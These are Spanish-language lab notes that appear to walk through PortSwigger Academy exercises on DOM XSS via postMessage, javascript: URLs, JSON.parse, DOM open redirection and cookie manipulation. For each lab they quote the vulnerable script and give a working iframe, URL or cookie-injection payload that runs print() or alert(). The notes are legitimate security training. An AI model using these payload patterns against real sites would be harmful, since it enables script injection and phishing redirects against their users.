-----
### QUE ES?
Una **DOM-based XSS** es una vulnerabilidad donde el código JavaScript de la propia página procesa datos controlados por el usuario y los inserta en el DOM sin validación adecuada.
Ocurre cuando la aplicación toma información desde fuentes como `location.search`, `location.hash`, `document.URL` o `document.referrer`, y la introduce en el HTML usando propiedades inseguras como `innerHTML` o `document.write`.
El ataque se ejecuta completamente en el navegador de la víctima, sin necesidad de que el servidor modifique la respuesta.
#### PASOS: 
- *REVISAR SCRIPTS CON CTRL + U*
- *REVISAR CODIGO CON CTRL +U BACK TO LOGIN*
- *REVISAR LAST VIEWED PRODUCTS*
### LAB1: DOM XSS USING WEB MESSAGES
Nos encontramos con este script:
`window.addEventListener('message', function(e) {  
`document.getElementById('ads').innerHTML = e.data;  
`})
Esto:
- Escucha mensajes mediante `window.addEventListener('message')`.
- Recibe datos enviados con `postMessage()`.
- Inserta directamente `e.data` en el DOM usando `innerHTML`. (Sin validar y sanitizar)

`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`
Carga la página vulnerable dentro de un `iframe` y, cuando termina de cargarse (`onload`), le envía un mensaje mediante `postMessage()` que contiene un payload XSS.

El `'*'` indica que el mensaje se envía sin restringir el origen destino, permitiendo que la página lo reciba y lo procese si tiene un listener `message` vulnerable.
### LAB2: DOM XSS USING WEB MESSAGE AND A JAVASCRIPT URL
Nos encontramos con este script:
`<script>
`	window.addEventListener('message', function(e) {
`		var url = e.data;
`		if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
`			location.href = url;
`		}
`	}, false);
`</script>
Funcionamiento:
- Registra un listener para el evento `message`.
- Cuando recibe un mensaje, guarda el contenido en `url` (`e.data`).
- Comprueba si el texto contiene `http:` o `https:`.
- Si la condición se cumple, redirige el navegador. (no valida ni sanitiza)

`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
Para explotarlo hacemos que busque `javascript:print()` ya que no sanitiza y como tenemos que incluir *http* o *https* lo comentamos.
### LAB3: DOM XSS USING WEB MESSAGE AND JSON.PARSE
Nos encontramos con este script:
`<script>
`	window.addEventListener('message', function(e) {
`		var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
`		document.body.appendChild(iframe);
`		try {
`			d = JSON.parse(e.data);
`		} catch(e) {
`			return;
`		}
`		switch(d.type) {
`			case "page-load":
`				ACMEplayer.element.scrollIntoView();
`				break;
`			case "load-channel":
`				ACMEplayer.element.src = d.url;
`				break;
`			case "player-height-changed":
`				ACMEplayer.element.style.width = d.width + "px";
`				ACMEplayer.element.style.height = d.height + "px";
`				break;
`		}
`	}, false);
`</script>
Funcionamiento:
-  Registra un listener para el evento `message`. (No hay validación de `e.origin`.)
- Cada vez que recibe un mensaje:
	- Crea un nuevo `<iframe>`
	- Lo añade al `body`
	- Lo encapsula dentro de un objeto `ACMEplayer`
- Solo procesa el mensaje si es un JSON válido.
- Actúa según el tipo de mensaje
	- Caso `"page-load"` → Hace scroll hasta el iframe.
	- Caso `"load-channel"` → Carga en el iframe la URL especificada en `d.url`. *(El que nos interesa)*
	- Caso `"player-height-changed"` → Permite cambiar el tamaño del iframe.

`<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`
De esta manera al cargar el iframe enviamos un *JSON* del tipo `"load-channel"` y en la url hacemos que ejecute *print()*
### LAB4: DOM BASED OPEN REDIRECTION
Vemos que el lab tiene un *Back to blog*:
`<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>`
Esto hace:
- Cuando haces clic en el enlace, se ejecuta el `onclick`.
- Se aplica esta expresión regular: `/url=(https?:\/\/.+)/.exec(location)`
- Busca en la URL actual un parámetro que tenga esta forma: `url=https://algo
- Si lo encuentra:
    - Redirige el navegador a esa URL.
- Si no lo encuentra:
    - Redirige a `/`.

Para explotarlo podemos introducir en la url un parámetro url que nos redirija a donde queramos por ejemplo al exploit server.
`https://YOUR-LAB-ID.web-security-academy.net/post?postId=3&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/`
### LAB5: DOM-BASED COOKIE MANIPULATION
En este laboratorio la aplicación muestra un apartado **“Last viewed product”**.  
Esto suele implicar que el producto visitado se guarda en una **cookie** y luego se lee desde el JavaScript del cliente para renderizarlo en el DOM.

El problema aparece cuando:
- El valor de la cookie se inserta en el DOM.
- No se valida ni se sanitiza correctamente.
`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">`
Esto hace:
- Visitamos una URL.
- El parámetro manipulado rompe el contexto HTML e inyecta: `<script>print()</script>`
- La aplicación guarda el producto visitado en una cookie (por ejemplo, `lastViewedProduct`).
- Cuando se carga la página principal, el JavaScript:
    - Lee la cookie.
    - Inserta su valor en el DOM sin sanitización.
- Como la cookie contiene código HTML inyectado, se ejecuta el `<script>`.
En el DOM se veria tal que así:
`<a href='https://0ac300e10311d7518005038a00c50055.web-security-academy.net/product?productId=1&'><script>alert(0)</script>'>Last viewed product</a><p>|</p>`
